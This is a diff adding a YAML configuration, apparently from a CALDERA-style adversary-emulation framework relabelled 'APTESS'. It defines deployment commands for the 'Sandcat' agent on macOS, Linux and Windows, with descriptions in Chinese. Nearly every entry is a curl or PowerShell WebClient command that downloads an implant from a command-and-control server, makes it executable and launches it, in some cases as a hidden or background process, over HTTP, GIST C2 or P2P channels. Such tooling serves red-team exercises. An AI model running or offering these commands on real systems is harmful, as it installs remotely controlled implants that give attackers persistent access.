@@ -1,0 +1,180 @@
+---
+
+- id: 2f34977d-9558-4c12-abad-349716777c6b
+  name: Sandcat
+  description: APTESS 的默认代理，由 Go 语言编写。默认通过 HTTP(S) 通信通道进行通信
+  tactic: command-and-control
+  technique:
+    attack_id: T1105
+    name: Ingress Tool Transfer
+  platforms:
+    darwin:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -server $server -v
+        variations:
+          - description: （AMD64）作为蓝队部署代理
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server -group blue &
+          - description: （AMD64）以随机名称下载并作为后台进程启动
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server &
+          - description: （AMD64）使用逗号分隔的扩展列表编译红队代理（需要 GoLang）
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
+          - description: （AMD64）通过 GIST C2 下载
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
+          - description: （AMD64）作为 P2P 代理部署，已知节点包含在编译后的代理中
+            architecture: AMD64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:amd64" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
+          - description: （ARM64）APTESS 的默认代理，由 Go 语言编写。默认通过 HTTP(S) 通信通道进行通信
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
+          - description: （ARM64）作为蓝队部署代理
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server -group blue &
+          - description: (ARM64) 以随机名称下载并作为后台进程启动
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server &
+          - description: (ARM64) 使用逗号分隔的扩展列表编译红队代理（需要 GoLang）
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -v
+          - description: (ARM64) 通过 GIST C2 下载
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
+          - description: (ARM64) 作为 P2P 代理部署，已知节点包含在编译后的代理中
+            architecture: ARM64
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:darwin" -H "architecture:arm64" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
+    linux:
+      sh:
+        command: |
+          server="#{app.contact.http}";
+          curl -s -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download > #{agents.implant_name};
+          chmod +x #{agents.implant_name};
+          ./#{agents.implant_name} -server $server -group red -v
+        variations:
+          - description: 作为蓝队部署代理
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server -group blue &
+          - description: 以随机名称下载并作为后台进程启动
+            command: |
+              server="#{app.contact.http}";
+              agent=$(curl -svkOJ -X POST -H "file:sandcat.go" -H "platform:linux" $server/file/download 2>&1 | grep -i "Content-Disposition" | grep -io "filename=.*" | cut -d'=' -f2 | tr -d '"\r') && chmod +x $agent 2>/dev/null;
+              nohup ./$agent -server $server &
+          - description: 使用逗号分隔的扩展列表编译红队代理（需要 GoLang）
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:#{agent.extensions}" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -group red -v
+          - description: 通过 GIST C2 下载
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:gist" -H "c2:gist" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -c2 GIST -v
+          - description: 作为 P2P 代理部署，已知节点包含在编译后的代理中
+            command: |
+              server="#{app.contact.http}";
+              curl -s -X POST -H "file:sandcat.go" -H "platform:linux" -H "gocat-extensions:proxy_http" -H "includeProxyPeers:HTTP" $server/file/download > #{agents.implant_name};
+              chmod +x #{agents.implant_name};
+              ./#{agents.implant_name} -server $server -listenP2P -v
+    windows:
+      psh:
+        command: |
+          $server="#{app.contact.http}";
+          $url="$server/file/download";
+          $wc=New-Object System.Net.WebClient;
+          $wc.Headers.add("platform","windows");
+          $wc.Headers.add("file","sandcat.go");
+          $data=$wc.DownloadData($url);
+          get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+          rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+          [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+          Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+        variations:
+          - description: 作为蓝队部署代理
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group blue" -WindowStyle hidden;
+          - description:  使用逗号分隔的扩展列表编译红队代理（需要 GoLang）
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $wc.Headers.add("gocat-extensions", "#{agent.extensions}");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red" -WindowStyle hidden;
+          - description: 作为 P2P 代理部署，已知节点包含在编译后的代理中
+            command: |
+              $server="#{app.contact.http}";
+              $url="$server/file/download";
+              $wc=New-Object System.Net.WebClient;
+              $wc.Headers.add("platform","windows");
+              $wc.Headers.add("file","sandcat.go");
+              $wc.Headers.add("gocat-extensions","proxy_http");
+              $wc.Headers.add("includeProxyPeers","HTTP");
+              $data=$wc.DownloadData($url);
+              get-process | ? {$_.modules.filename -like "C:\Users\Public\#{agents.implant_name}.exe"} | stop-process -f;
+              rm -force "C:\Users\Public\#{agents.implant_name}.exe" -ea ignore;
+              [io.file]::WriteAllBytes("C:\Users\Public\#{agents.implant_name}.exe",$data) | Out-Null;
+              Start-Process -FilePath C:\Users\Public\#{agents.implant_name}.exe -ArgumentList "-server $server -group red -listenP2P -v" -WindowStyle hidden;
